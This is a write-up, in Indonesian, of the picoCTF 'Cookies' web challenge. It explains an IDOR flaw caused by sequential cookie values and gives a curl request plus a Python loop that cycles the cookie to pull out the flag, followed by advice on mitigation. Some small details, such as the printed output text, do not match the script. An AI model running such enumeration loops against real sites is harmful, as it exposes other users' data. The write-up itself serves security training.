# Writeup: Cookies (Challenge ID: 173)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Session Cookie Enumeration & IDOR
- **Difficulty:** Easy
- **Author:** madStacks
- **Event:** picoCTF 2021
- **Points:** 40
- **Flag:** `academy{3v3ry1_l0v3s_c00k135_90a3a7cb}`

---

## Problem Statement & Scope
Disediakan sebuah aplikasi web pencarian jenis kue kering ("Cookies"). Aplikasi memungkinkan pengguna memasukkan nama kue dan menyimpan referensi pilihan pengguna ke dalam cookie browser. Pengguna ditugaskan mencari jenis kue yang bernilai khusus untuk mengungkap flag.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Insecure Direct Object References (IDOR) via Cookie Values:** Aplikasi memetakan status profil kue yang ditampilkan berdasarkan nilai indeks numerik sederhana (`name=0`, `name=1`, `name=2`, ...).
2. **Predictable Identifier Sequence:** Penggunaan nomor sekuensial yang dapat ditebak (*sequential integer identifiers*) tanpa perlindungan kriptografis memungkinkan penyerang melakukan serangan enumerasi menyeluruh (*brute-force enumeration*) terhadap seluruh ruang data.
3. **Ketiadaan Validasi Akses:** Server secara langsung mempercayai nilai cookie yang dikirimkan oleh klien tanpa memeriksa apakah pengguna memiliki hak akses khusus terhadap data yang diindeks.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. Akses halaman utama dan lakukan pencarian awal (misalnya kue `snickerdoodle`):
   ```bash
   curl -i -d "name=snickerdoodle" http://xebec.cylabacademy.net:27633/search
   ```
2. Server merespons dengan pengalihan ke `/check` dan menetapkan cookie `name=0`:
   ```http
   HTTP/1.1 302 FOUND
   Set-Cookie: name=0; Path=/
   Location: /check
   ```
3. Bangun skrip iterasi otomatis untuk menguji nilai indeks `name=0` hingga `name=30`:
   ```python
   import urllib.request, re

   base = "http://xebec.cylabacademy.net:27633/check"
   for i in range(30):
       req = urllib.request.Request(base, headers={"Cookie": f"name={i}"})
       resp = urllib.request.urlopen(req)
       body = resp.read().decode()
       if "academy{" in body:
           print(f"Found flag at index {i}:", re.search(r"academy\{[^}]+\}", body).group(0))
           break
   ```
4. Pada pengujian indeks `name=18`, server menampilkan halaman spesial berisi flag:
   ```text
   Found flag with cookie name=18: academy{3v3ry1_l0v3s_c00k135_90a3a7cb}
   ```

---

## Flag & Verifikasi
- **Flag:** `academy{3v3ry1_l0v3s_c00k135_90a3a7cb}`
- **Verifikasi:** POST `/api/submissions/` mengembalikan respons `{"correct": true}` (HTTP Status 201).

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Gunakan UUIDv4 / Opaque Session Tokens:** Jangan pernah menggunakan integer sekuensial (`0, 1, 2...`) sebagai pengenal langsung dalam cookie atau parameter URL. Gunakan UUID acak versi 4 atau token kriptografis berkecepatan acak tinggi.
- **Validasi Hak Akses Sisi Server:** Setiap permintaan akses terhadap objek data harus selalu memverifikasi apakah identitas sesi saat ini berhak mengakses entitas tersebut, bukan hanya mengandalkan nilai yang diberikan klien.
